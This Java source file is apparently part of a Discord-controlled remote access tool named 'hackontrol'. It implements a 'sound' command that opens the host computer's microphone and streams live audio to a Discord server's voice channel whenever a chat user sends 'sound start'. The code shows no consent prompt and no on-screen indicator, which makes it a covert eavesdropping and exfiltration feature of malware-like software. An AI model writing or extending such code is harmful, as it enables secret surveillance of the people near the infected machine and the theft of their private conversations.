package com.khopan.hackontrol.command;

import java.util.List;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import com.khopan.hackontrol.MicrophoneSendHandler;
import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;

import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.entities.channel.middleman.GuildMessageChannel;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.managers.AudioManager;

public class SoundCommand implements Command {
	private AudioManager manager;

	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("sound").then(LiteralArgumentBuilder.<CommandSource>literal("start").executes(context -> {
			CommandSource source = (CommandSource) context.getSource();

			if(this.manager != null) {
				source.sendMessage("Error: Sound is already started");
				return -1;
			}

			AudioInputStream audioStream;
			int size;

			try {
				Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
				TargetDataLine targetLine = (TargetDataLine) AudioSystem.getLine(info);
				targetLine.open();
				targetLine.start();
				audioStream = new AudioInputStream(targetLine);
				size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
			} catch(Throwable Errors) {
				source.sendMessage(Errors.toString());
				return -1;
			}

			MessageChannel messageChannel = source.getChannel();

			if(!(messageChannel instanceof MessageChannelUnion)) {
				return -2;
			}

			GuildMessageChannel guildChannel = ((MessageChannelUnion) messageChannel).asGuildMessageChannel();
			Guild guild = guildChannel.getGuild();
			List<VoiceChannel> voiceChannelList = guild.getVoiceChannels();

			if(voiceChannelList.isEmpty()) {
				source.sendMessage("Error: No voice channels are found in this server");
				return -1;
			}

			VoiceChannel voiceChannel = voiceChannelList.get(0);
			this.manager = guild.getAudioManager();
			this.manager.setSendingHandler(new MicrophoneSendHandler(audioStream, size));
			this.manager.openAudioConnection(voiceChannel);
			source.sendMessage("Sound start successfully!");
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("stop").executes(context -> {
			CommandSource source = (CommandSource) context.getSource();

			if(this.manager == null) {
				source.sendMessage("Error: Sound is not started");
				return -1;
			}

			this.manager.closeAudioConnection();
			source.sendMessage("Sound stop successfully!");
			this.manager = null;
			return 1;
		})));
	}
}
